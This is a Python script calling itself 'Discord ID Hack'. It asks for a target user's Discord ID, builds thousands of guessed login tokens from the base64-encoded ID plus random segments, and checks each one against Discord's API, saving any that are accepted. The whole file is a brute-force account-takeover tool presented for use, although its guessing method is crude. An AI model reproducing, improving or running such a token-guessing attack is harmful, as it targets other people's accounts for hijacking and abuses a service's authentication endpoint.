# Pre-Load

print("Loading Token ID Hack", end="\r")

# Check

if not __name__ == "__main__":
	print("Don't import it...")
	quit()

# Imports

try:
	import base64
	import time
	import os
	import grequests
	import requests
	import colorama
except ModuleNotFoundError:
	print("Import Error. Please Install Modules. (requirements.txt)")
	input("Enter to exit")
	quit()
from strgen import StringGenerator as SG
from colorama import init
from colorama import Fore, Back, Style

# Functions

def fix_base64(fix):
	fix1 = fix.replace("b'", "")
	fixed = fix1.replace("'", "")
	return fixed

def enter_id():
	try:
		userid = int(input(f"Enter User ID To {Fore.RED}Hack{Style.RESET_ALL} >>> "))
	except ValueError:
		print(f"{Fore.RED}[ERROR] - Enter a User ID Not a String!{Style.RESET_ALL}")
		input(f"{Fore.MAGENTA}[INFO] - Press Enter{Style.RESET_ALL}")
		try:
			userid = int(input(f"Enter User ID To {Fore.RED}Hack{Style.RESET_ALL} >>> "))
		except ValueError:
			print(f"{Fore.RED}[ERROR] - BRO ENTER A ID!!!!!!!{Style.RESET_ALL}")
			print(f"{Fore.MAGENTA}[INFO] - Quiting in 5 seconds{Style.RESET_ALL}")
			wait(5)
			quit()





	encodeduserid = base64.b64encode(str(userid).encode('ascii'))
	return encodeduserid


def logo():
	print(f"""
  			 {Fore.GREEN}888b. w                         8 
			 8   8 w d88b .d8b .d8b. 8d8b .d88 
			 8   8 8 `Yb. 8    8' .8 8P   8  8 
			 888P' 8 Y88P `Y8P `Y8P' 8    `Y88 
			                                   
   			 {Fore.RED}888 888b.    8   8           8    
			  8  8   8    8www8 .d88 .d8b 8.dP 
			  8  8   8    8   8 8  8 8    88b  
			 888 888P'    8   8 `Y88 `Y8P 8 Yb 
        	                            {Fore.YELLOW}By IfweReZ [Y]#3704{Style.RESET_ALL}                       
		""")

def generate(eid):
	second = SG(r"[\w]{6}").render()
	third = SG(r"[\w]{38}").render()
	token = f"{eid}.{second}.{third}"
	return token

def tries():
	try:
		tries = int(input(f"Number of {Fore.RED}Hack{Style.RESET_ALL} Attempts >>> {Fore.CYAN}"))
		return tries
	except (NameError, ValueError):
		print(f"{Fore.RED}[ERROR] - Enter a Number Not a String!{Style.RESET_ALL}")
		input(f"{Fore.MAGENTA}[INFO] - Press Enter{Style.RESET_ALL}")
		try:
			tries = int(input(f"Number of {Fore.RED}Hack{Style.RESET_ALL} Attempts >>> {Fore.CYAN}"))
			return tries
		except ValueError:
			print(f"{Fore.RED}[ERROR] - BRO ENTER A NUMBER!!!!!!!{Style.RESET_ALL}")
			print(f"{Fore.MAGENTA}[INFO] - Quiting in 5 seconds{Style.RESET_ALL}")
			wait(5)
			quit()

def check():
	with open('Generated.txt', 'r') as f:
		for line in f:
			token = line.rstrip("\n")
			headers = {
	    		'Authorization': f'{token}'  
			}
			src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
			if src.status_code == 200:
				with open("valid.txt", "a") as f:
					f.write(f"{token}\n")
					f.close()
				print(f'{Fore.GREEN}Valid Token! >>> {Fore.YELLOW}' + token + f"{Style.RESET_ALL} {Fore.GREEN}Saved in valid.txt{Style.RESET_ALL}")
			else:
				with open("invalid.txt", "a") as f:
					f.write(f"{token}\n")
					f.close()
				print(f'{Fore.RED}Invalid Token >>> {Fore.YELLOW}' + token + f"{Style.RESET_ALL} {Fore.GREEN}Saved In invalid.txt{Style.RESET_ALL}")

# Load
window = "mode 89,13"
os.system(window)

os.system("title Discord ID Hack By IfweReZ [Y]#3704")

with open('Generated.txt', 'wb') as f:
	try:
		for line in f:
			line.write("")
	except:
		pass
	f.close()

# Config

wait = time.sleep

# Main Code

print("                                             ", end="\r")

logo()

userid = fix_base64(str(enter_id()))


tries = tries()

for i in range(tries + 1):
	print(f"{Fore.GREEN}Generated Token {Fore.YELLOW}{i}{Style.RESET_ALL}", end="\r")
	token = generate(userid)
	f = open('Generated.txt', 'a')
	f.write(token+"\n")

check()

print(f"{Fore.GREEN}[INFO] - Finised Generating And Checking!{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}[INFO] - Quting in 5 seconds!{Style.RESET_ALL}")
wait(5)
quit()

# End